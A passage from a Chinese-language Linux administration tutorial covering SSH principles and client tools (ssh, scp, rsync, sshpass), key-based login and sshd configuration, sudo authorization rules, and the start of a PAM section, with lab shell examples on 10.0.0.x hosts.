alt="img"></a></p><blockquote><ul><li>客户端发起链接请求</li><li>服务端返回自己的公钥，以及一个会话ID（这一步客户端得到服务端公钥）</li><li>客户端生成密钥对</li><li>客户端用自己的公钥异或会话ID，计算出一个值Res，并用服务端的公钥加密</li><li>客户端发送加密后的值到服务端，服务端用私钥解密，得到Res</li><li>服务端用解密后的值Res异或会话ID，计算出客户端的公钥（这一步服务端得到客户端公钥）</li><li>最终：双方各自持有三个秘钥，分别为自己的一对公、私钥，以及对方的公钥，之后的所有通讯都会被加密</li></ul></blockquote><h3 id="1-2-ssh加密通讯原理"><a href="#1-2-ssh加密通讯原理" class="headerlink" title="1.2 ssh加密通讯原理"></a>1.2 ssh加密通讯原理</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018143055616-1558234375.png"><img src="2927659-20221018143055616-1558234375.png" alt="img"></a></p><hr><h2 id="2-openssh-服务"><a href="#2-openssh-服务" class="headerlink" title="2 openssh 服务"></a>2 openssh 服务</h2><blockquote><p>OpenSSH是SSH （Secure SHell） 协议的免费开源实现，一般在各种Linux版本中会默认安装，基于C/S结构</p><p>Openssh软件相关包：</p><ul><li>openssh</li><li>openssh-clients</li><li>openssh-server</li></ul><p>服务器端程序：/usr/sbin/sshd</p><p>Unit 文件：/usr/lib/systemd/system/sshd.service</p><p>客户端：</p><ul><li>Linux Client: ssh, scp, sftp，slogin</li><li>Windows Client：xshell, MobaXterm,putty, securecrt, sshsecureshellclient</li></ul></blockquote><h3 id="2-1-客户端-ssh命令"><a href="#2-1-客户端-ssh命令" class="headerlink" title="2.1 客户端 ssh命令"></a>2.1 客户端 ssh命令</h3><blockquote><p>ssh命令是ssh客户端，允许实现对远程系统经验证地加密安全访问</p><p>当用户远程连接ssh服务器时，会复制ssh服务器/etc/ssh/ssh_host<em>key.pub文件中的公钥到客户机的</em>*~/.ssh/know_hosts**中。下次连接时，会自动匹配相对应的私钥，不能匹配，将拒绝连接</p></blockquote><p>ssh客户端配置文件：<code> /etc/ssh/ssh_config</code></p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh [user@]host [COMMAND]<br>ssh [-l user] host [COMMAND]<br></code></pre></td></tr></table></figure><h4 id="范例：禁止首次连接的询问过程"><a href="#范例：禁止首次连接的询问过程" class="headerlink" title="范例：禁止首次连接的询问过程"></a>范例：禁止首次连接的询问过程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/etc/ssh/ssh_config 文件修改</span><br><span class="hljs-comment">#首次登录不显示检查提示</span><br>StrictHostKeyChecking no<br></code></pre></td></tr></table></figure><blockquote><p> 常见选项</p><ul><li>-p port #远程服务器监听的端口</li><li>-b #指定连接的源IP</li><li>-v #调试模式</li><li>-C #压缩方式</li><li>-X #支持x11转发</li><li>-t #强制伪tty分配，如：ssh -t remoteserver1 ssh -t remoteserver2  ssh  remoteserver3</li><li>-o option  如：-o StrictHostKeyChecking=no</li><li>-i <file>  #指定私钥文件路径，实现基于key验证，默认使用文件： <del>/.ssh/id_dsa,</del>/.ssh/id_ecdsa, <del>/.ssh/id_ed25519，</del>/.ssh/id_rsa等</li></ul></blockquote><h4 id="范例：远程执行命令"><a href="#范例：远程执行命令" class="headerlink" title="范例：远程执行命令"></a>范例：远程执行命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># ssh 10.0.0.128 cat /etc/hosts</span><br>root@10.0.0.128<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="hljs-string">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br></code></pre></td></tr></table></figure><h4 id="范例：在远程主机运行本地shell脚本"><a href="#范例：在远程主机运行本地shell脚本" class="headerlink" title="范例：在远程主机运行本地shell脚本"></a>范例：在远程主机运行本地shell脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos8 ~]<span class="hljs-comment"># hostname -I</span><br>10.0.0.8<br>[root@centos8 ~]<span class="hljs-comment"># cat test.sh </span><br><span class="hljs-comment">#!/bin/bash</span><br>hostname -I<br><br>[root@centos8 ~]<span class="hljs-comment"># ssh 10.0.0.18 /bin/bash &lt; test.sh </span><br>root@10.0.0.18<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">10.0.0.18</span><br></code></pre></td></tr></table></figure><p><strong>范例：统计ssh登录失败次数最多的前十个远程IP</strong></p><p><strong>注：此命令可用于检测是否有黑客尝试破解你的服务器密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># lastb | awk &#x27;&#123;print $3&#125;&#x27;|sort |uniq -c|sort -nr|head</span><br>      3 10.0.0.128<br>      1 Sat<br>      1<br></code></pre></td></tr></table></figure><hr><h3 id="2-2-其它ssh客户端工具"><a href="#2-2-其它ssh客户端工具" class="headerlink" title="2.2 其它ssh客户端工具"></a>2.2 其它ssh客户端工具</h3><h4 id="2-2-1-scp-命令"><a href="#2-2-1-scp-命令" class="headerlink" title="2.2.1 scp 命令"></a>2.2.1 scp 命令</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">scp <span class="hljs-selector-attr">[options]</span> <span class="hljs-attribute">SRC</span>... DEST/<br></code></pre></td></tr></table></figure><blockquote><p>常用选项</p><ul><li>-C 压缩数据流</li><li><strong>-r 递归复制</strong></li><li><strong>-p 保持原文件的属性信息</strong></li><li>-q 静默模式</li><li>-P PORT 指明remote host的监听的端口</li></ul></blockquote><h4 id="2-2-2-rsync-命令"><a href="#2-2-2-rsync-命令" class="headerlink" title="2.2.2 rsync 命令"></a>2.2.2 rsync 命令</h4><p>rsync工具可以基于ssh和rsync协议实现高效率的远程系统之间复制文件，使用安全的shell连接做为传输方式，<strong>比scp更快，基于增量数据同步，即只复制两方不同的文件</strong>，此工具来自于rsync包</p><p>注意：通信两端主机都需要安装 rsync 软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rsync -av /etc  server1:/tmp/ <span class="hljs-comment">#复制目录和目录下文件</span><br>rsync -av /etc/ server1:/tmp/ <span class="hljs-comment">#只复制目录下文件</span><br></code></pre></td></tr></table></figure><blockquote><p>常用选项</p><ul><li>-n 模拟复制过程</li><li><strong>-v 显示详细过程</strong></li><li>-r 递归复制目录树</li><li><strong>-p 保留权限</strong></li><li>-t 保留修改时间戳</li><li>-g 保留组信息</li><li>-o 保留所有者信息</li><li>-l 将软链接文件本身进行复制（默认）</li><li>-L 将软链接文件指向的文件复制</li><li>-u 如果接收者的文件比发送者的文件较新，将忽略同步</li><li>-z 压缩，节约网络带宽</li><li>-a 存档，相当于-rlptgoD，但不保留ACL（-A）和SELinux属性（-X）</li><li>–delete 源数据删除，目标数据也自动同步删除</li><li>–progress 显示进度</li><li>–bwlimit=5120 #限速以KB为单位,5120表示5MB</li></ul></blockquote><hr><h4 id="2-2-3-sshpass自动登录-ssh工具"><a href="#2-2-3-sshpass自动登录-ssh工具" class="headerlink" title="2.2.3 sshpass自动登录 ssh工具"></a>2.2.3 sshpass自动登录 ssh工具</h4><blockquote><p>由EPEL源提供，ssh登陆不能在命令行中指定密码。sshpass的出现，解决了这一问题。sshpass用于非交互SSH的密码验证，一般用在sh脚本中，无须再次输入密码（本机known_hosts文件中有的主机才能生效）。它允许你<strong>用 -p 参数指定明文密码</strong>，然后直接登录远程服务器，它支持密码从命令行、文件、环境变量中读取。</p><p>常见选项</p><ul><li>-p password #后跟密码它允许你用 -p 参数指定明文密码，然后直接登录远程服务器</li><li>-f filename #后跟保存密码的文件名，密码是文件内容的第一行</li><li>-e #将环境变量SSHPASS作为密码</li></ul></blockquote><h5 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sshpass [<span class="hljs-keyword">option</span>] <span class="hljs-keyword">command</span> parameters<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># sshpass -p 000000 ssh -o StrictHostKeyChecking=no 10.0.0.128</span><br>Activate the web console with: systemctl <span class="hljs-built_in">enable</span> --now cockpit.socket<br><br>Last login: Tue Oct 18 12:55:16 2022 from 10.0.0.1<br></code></pre></td></tr></table></figure><h5 id="范例：批量修改多台主机的root密码为随机密码"><a href="#范例：批量修改多台主机的root密码为随机密码" class="headerlink" title="范例：批量修改多台主机的root密码为随机密码"></a>范例：批量修改多台主机的root密码为随机密码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat change_root_password.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment">#******************************************************</span><br><span class="hljs-comment"># Author:          会不会有那么一天</span><br><span class="hljs-comment"># E-mail:          willoneday@qq.com</span><br><span class="hljs-comment"># Date:            2022-10-18</span><br><span class="hljs-comment"># FileName:        change_root_password.sh</span><br><span class="hljs-comment"># Version:         1.0.0</span><br><span class="hljs-comment"># Description:     The test script</span><br><span class="hljs-comment"># BLOG:            https://www.cnblogs.com/Willoneday</span><br><span class="hljs-comment">#******************************************************</span><br><br>rpm -q sshpass &amp;&gt; /dev/null || yum -y install sshpass<br><span class="hljs-built_in">export</span> SSHPASS=123456<br>NET=10.0.0<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..254&#125;;<span class="hljs-keyword">do</span><br>    &#123;<br>        PASS=`openssl rand -<span class="hljs-built_in">base64</span> 9`<br>        sshpass -e ssh  -o  StrictHostKeyChecking=no <span class="hljs-variable">$NET</span>.<span class="hljs-variable">$i</span> <span class="hljs-string">&quot;echo <span class="hljs-variable">$PASS</span>|passwd --stdin root &amp;&gt; /dev/null&quot;</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$NET</span>.<span class="hljs-variable">$i</span>:<span class="hljs-variable">$PASS</span> &gt;&gt; host.txt<br>    &#125;&amp;<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">wait</span><br></code></pre></td></tr></table></figure><h5 id="范例：批量部署多台主机基于key验证脚本"><a href="#范例：批量部署多台主机基于key验证脚本" class="headerlink" title="范例：批量部署多台主机基于key验证脚本"></a>范例：批量部署多台主机基于key验证脚本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat sshpass.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment">#******************************************************</span><br><span class="hljs-comment"># Author:          会不会有那么一天</span><br><span class="hljs-comment"># E-mail:          willoneday@qq.com</span><br><span class="hljs-comment"># Date:            2022-10-18</span><br><span class="hljs-comment"># FileName:        sshpass.sh</span><br><span class="hljs-comment"># Version:         1.0.0</span><br><span class="hljs-comment"># Description:     The test script</span><br><span class="hljs-comment"># BLOG:            https://www.cnblogs.com/Willoneday</span><br><span class="hljs-comment">#******************************************************</span><br><br><span class="hljs-comment">#!/bin/bash</span><br>NET=10.0.0<br>PASS=123456<br><br>ssh-keygen  -P <span class="hljs-string">&quot;&quot;</span>  -f /root/.ssh/id_rsa &amp;&gt; /dev/null<br>rpm -q sshpass &amp;&gt; /dev/null || yum -y install sshpass &amp;&gt; /dev/null<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..100&#125;;<span class="hljs-keyword">do</span><br>&#123;<br>    sshpass  -p <span class="hljs-variable">$PASS</span> ssh-copy-id -o  StrictHostKeyChecking=no -i /root/.ssh/id_rsa.pub <span class="hljs-variable">$NET</span>.<span class="hljs-variable">$i</span> &amp;&gt; /dev/null<br>&#125;&amp;<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">wait</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-3-ssh登录验证方式介绍"><a href="#2-3-ssh登录验证方式介绍" class="headerlink" title="2.3 ssh登录验证方式介绍"></a>2.3 ssh登录验证方式介绍</h3><blockquote><p>ssh服务登录的常用验证方式</p><ul><li>用户/口令</li><li>基于密钥</li></ul></blockquote><h4 id="基于用户和口令登录验证"><a href="#基于用户和口令登录验证" class="headerlink" title="基于用户和口令登录验证"></a>基于用户和口令登录验证</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018150700752-1300345871.png"><img src="2927659-20221018150700752-1300345871.png" alt="img"></a></p><blockquote><ol><li>客户端发起ssh请求，服务器会把自己的公钥发送给用户</li><li>用户会根据服务器发来的公钥对密码进行加密</li><li>加密后的信息回传给服务器，服务器用自己的私钥解密，如果密码正确，则用户登录成功</li></ol></blockquote><h4 id="基于密钥的登录方式"><a href="#基于密钥的登录方式" class="headerlink" title="基于密钥的登录方式"></a>基于密钥的登录方式</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018150738804-1476474728.png"><img src="2927659-20221018150738804-1476474728.png" alt="img"></a></p><blockquote><ol><li>首先在客户端生成一对密钥（ssh-keygen）</li><li>并将客户端的公钥ssh-copy-id 拷贝到服务端</li><li>当客户端再次发送一个连接请求，包括ip、用户名</li><li>服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串</li><li>服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端</li><li>得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端</li><li>服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录</li></ol></blockquote><hr><h3 id="2-4-实现基于密钥的登录方式"><a href="#2-4-实现基于密钥的登录方式" class="headerlink" title="2.4 实现基于密钥的登录方式"></a>2.4 实现基于密钥的登录方式</h3><h4 id="在客户端生成密钥对"><a href="#在客户端生成密钥对" class="headerlink" title="在客户端生成密钥对"></a><strong>在客户端生成密钥对</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa [-P <span class="hljs-string">&#x27;password&#x27;</span>] [-f “~/.ssh/id_rsa<span class="hljs-string">&quot;]</span><br></code></pre></td></tr></table></figure><h4 id="把公钥文件传输至远程服务器对应用户的家目录"><a href="#把公钥文件传输至远程服务器对应用户的家目录" class="headerlink" title="把公钥文件传输至远程服务器对应用户的家目录"></a>把公钥文件传输至远程服务器对应用户的家目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-copy-id [-i [identity_file]] [user@]host<br></code></pre></td></tr></table></figure><h4 id="重设私钥口令"><a href="#重设私钥口令" class="headerlink" title="重设私钥口令"></a>重设私钥口令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -p<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#对私钥加密</span><br>[root@centos8 ~]<span class="hljs-comment"># ssh-keygen -p</span><br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> the key is (/root/.ssh/id_rsa): <br>Key has comment <span class="hljs-string">&#x27;root@centos8&#x27;</span><br>Enter new passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved with the new passphrase.<br>[root@centos8 ~]<span class="hljs-comment"># ssh 10.0.0.7</span><br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;/root/.ssh/id_rsa&#x27;</span>: <span class="hljs-comment">#输入私钥的密码</span><br>Last login: Fri May 22 08:47:50 2020 from 10.0.0.8<br>[root@centos7 ~]<span class="hljs-comment"># exit</span><br><span class="hljs-built_in">logout</span><br>Connection to 10.0.0.7 closed.<br></code></pre></td></tr></table></figure><hr><h3 id="2-5-ssh服务器配置"><a href="#2-5-ssh服务器配置" class="headerlink" title="2.5 ssh服务器配置"></a>2.5 ssh服务器配置</h3><blockquote><p>服务器端：sshd</p><p>服务器端的配置文件: /etc/ssh/sshd_config</p><p>服务器端的配置文件帮助：man 5 sshd_config</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#常用参数：</span><br>Port  22     <span class="hljs-comment">#生产建议修改</span><br>ListenAddress ip<br>LoginGraceTime 2m<br>PermitRootLogin <span class="hljs-built_in">yes</span> <span class="hljs-comment">#默认ubuntu不允许root远程ssh登录</span><br>StrictModes <span class="hljs-built_in">yes</span>   <span class="hljs-comment">#检查.ssh/文件的所有者，权限等</span><br>MaxAuthTries   6     <span class="hljs-comment">#pecifies the maximum number of authentication </span><br>attempts permitted per connection. Once the number of failures reaches half this <br>value, additional failures are logged. The default is 6.<br>MaxSessions  10         <span class="hljs-comment">#同一个连接最大会话</span><br>PubkeyAuthentication <span class="hljs-built_in">yes</span>     <span class="hljs-comment">#基于key验证</span><br>PermitEmptyPasswords no      <span class="hljs-comment">#空密码连接</span><br>PasswordAuthentication <span class="hljs-built_in">yes</span>   <span class="hljs-comment">#基于用户名和密码连接</span><br>GatewayPorts no<br>ClientAliveInterval 10 <span class="hljs-comment">#单位:秒</span><br>ClientAliveCountMax 3 <span class="hljs-comment">#默认3</span><br>UseDNS <span class="hljs-built_in">yes</span> <span class="hljs-comment">#提高速度可改为no</span><br>GSSAPIAuthentication <span class="hljs-built_in">yes</span> <span class="hljs-comment">#提高速度可改为no</span><br>MaxStartups    <span class="hljs-comment">#未认证连接最大值，默认值10</span><br>Banner /path/file<br><br><span class="hljs-comment">#以下可以限制可登录用户的办法：</span><br>AllowUsers user1 user2 user3<br>DenyUsers user1 user2 user3<br>AllowGroups g1 g2<br>DenyGroups g1 g2<br></code></pre></td></tr></table></figure><h4 id="范例：解决ssh登录缓慢的问题"><a href="#范例：解决ssh登录缓慢的问题" class="headerlink" title="范例：解决ssh登录缓慢的问题"></a>范例：解决ssh登录缓慢的问题</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/ssh/sshd_config<br>UseDNS no<br>GSSAPIAuthentication no<br>systemctl restart sshd<br></code></pre></td></tr></table></figure><hr><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><h1 id="四、利用-sudo-实现授权"><a href="#四、利用-sudo-实现授权" class="headerlink" title="四、利用 sudo 实现授权"></a>四、利用 sudo 实现授权</h1><h2 id="1-sudo-介绍"><a href="#1-sudo-介绍" class="headerlink" title="1 sudo 介绍"></a>1 sudo 介绍</h2><blockquote><p>sudo 即superuser do，允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性</p></blockquote><h2 id="2-sudo-组成"><a href="#2-sudo-组成" class="headerlink" title="2 sudo 组成"></a>2 sudo 组成</h2><p>包：sudo</p><p>配置文件：/etc/sudo.conf</p><p><strong>授权规则配置文件：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/sudoers<br>/etc/sudoers.d<br></code></pre></td></tr></table></figure><p>安全编辑授权规则文件和语法检查工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/sbin/visudo<br><br><span class="hljs-comment">#范例</span><br><span class="hljs-comment">#检查语法</span><br>visudo -c<br><br><span class="hljs-comment">#检查指定配置文件语法</span><br>visudo -f /etc/sudoers.d/test<br></code></pre></td></tr></table></figure><p>授权编辑规则文件的工具：/usr/bin/sudoedit</p><p>执行授权命令：/usr/bin/sudo</p><p>时间戳文件：/var/db/sudo</p><p>日志文件：/var/log/secure</p><h2 id="3-sudo-命令"><a href="#3-sudo-命令" class="headerlink" title="3 sudo 命令"></a>3 sudo 命令</h2><blockquote><p>sudo -i -u willoneday 切换身份功能和 su 相似,但不一样,sudo必须提前授权,而且要输入自已的密码</p><p>sudo [-u user] COMMAND</p><ul><li>-V 显示版本信息等配置信息</li><li><strong>-u user 默认为root</strong></li><li>-l,ll 列出用户在主机上可用的和被禁止的命令</li><li>-v 再延长密码有效期限5分钟,更新时间戳</li><li>-k 清除时间戳（1970-01-01），下次需要重新输密码</li><li>-K 与-k类似，还要删除时间戳文件</li><li>-b 在后台执行指令</li><li>-p 改变询问密码的提示符号 示例：-p “password on %h for user %p: “</li></ul></blockquote><h2 id="4-sudo-授权规则配置"><a href="#4-sudo-授权规则配置" class="headerlink" title="4 sudo 授权规则配置"></a>4 sudo 授权规则配置</h2><p>配置文件格式说明：/etc/sudoers, /etc/sudoers.d/</p><p>配置文件中支持使用通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">? 任意单一字符<br>* 匹配任意长度字符<br>[wxc] 匹配其中一个字符<br>[!wxc] 除了这三个字符的其它字符<br>\x 转义 <br>[[alpha]] 字母<br></code></pre></td></tr></table></figure><blockquote><p>配置文件规则有两类</p><p>1、别名定义：不是必须的</p><p>2、授权规则：必须的</p></blockquote><h3 id="sudoers-授权规则格式"><a href="#sudoers-授权规则格式" class="headerlink" title="sudoers 授权规则格式"></a>sudoers 授权规则格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">用户 登入主机=(代表用户) 命令（绝对路径）<br>user host=(runas) <span class="hljs-built_in">command</span><br><br>user: 运行命令者的身份<br>host: 通过哪些主机<br>(runas)：以哪个用户的身份<br><span class="hljs-built_in">command</span>: 运行哪些命令<br><br><span class="hljs-comment">#范例</span><br>root ALL=(ALL) ALL<br></code></pre></td></tr></table></figure><blockquote><p> sudoers的别名</p><p>User和runas:</p><p>username</p><ul><li>#uid</li><li>%group_name</li><li>%#gid</li><li>user_alias|runas_alias</li></ul><p>host:</p><ul><li>ip或hostname</li><li>network(/netmask)</li><li>host_alias</li></ul><p>command:</p><ul><li>command name</li><li>directory</li><li>sudoedit</li><li>Cmnd_Alias</li></ul></blockquote><p>sudo别名有四种类型：</p><ul><li>User_Alias</li><li>Runas_Alias</li><li>Host_Alias</li><li>Cmnd_Alias</li></ul><p> 别名定义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Alias_Type NAME1 = item1,item2,item3 : NAME2 = item4, item5<br></code></pre></td></tr></table></figure><h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Student ALL=(ALL)   ALL<br>%wheel  ALL=(ALL)   ALL<br></code></pre></td></tr></table></figure><h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#bash -c 将后面所有信字符串作为整体进行sudo</span><br><span class="hljs-comment">#注意&quot;&quot;必须加,否则只授权 &gt;&gt; 前面的命令sudo </span><br>[rye@centos7 ~]$ sudo bash  -c <span class="hljs-string">&quot;echo 1.2.3.4 www.test.com &gt;&gt; /etc/hosts&quot;</span><br>[rye@centos7 ~]$ <span class="hljs-built_in">cat</span> /etc/hosts<br>127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4 <br>::1         localhost localhost.localdomain localhost6 localhost6.localdomain6<br>1.2.3.4 www.test.com<br></code></pre></td></tr></table></figure><h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># su - rye</span><br>Last login: Sat Oct 15 23:16:52 CST 2022 on pts/2<br>[rye@rocky01 ~]$ mount /dev/sr0 /mnt<br>mount: only root can <span class="hljs-keyword">do</span> that<br>[rye@rocky01 ~]$ <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">logout</span><br>[root@rocky01 ~]<span class="hljs-comment"># vim /etc/sudoers</span><br>[root@rocky01 ~]<span class="hljs-comment"># cat /etc/sudoers |grep rye</span><br>rye     ALL=(root) /usr/bin/mount<br>[root@rocky01 ~]<span class="hljs-comment"># su - rye</span><br>Last login: Tue Oct 18 16:11:09 CST 2022 on pts/2<br>[rye@rocky01 ~]$ sudo mount /dev/sr0 /mnt<br>[sudo] password <span class="hljs-keyword">for</span> rye:<br>mount: /mnt: WARNING: device write-protected, mounted read-only.<br></code></pre></td></tr></table></figure><hr><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><h1 id="五、PAM认证机制"><a href="#五、PAM认证机制" class="headerlink" title="五、PAM认证机制"></a>五、PAM认证机制</h1><h2 id="1-PAM-介绍"><a href="#1-PAM-介绍" class="headerlink" title="1 PAM 介绍"></a>1 PAM 介绍</h2><blockquote><p> PAM：Pluggable Authentication Modules，插件式的验证模块，Sun公司于1995 年开发的一种与认证相关的通用框架机制。PAM 只关注如何为服务验证用户的 API，通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序一种认证框架，自身不做认证</p></blockquote><p><a 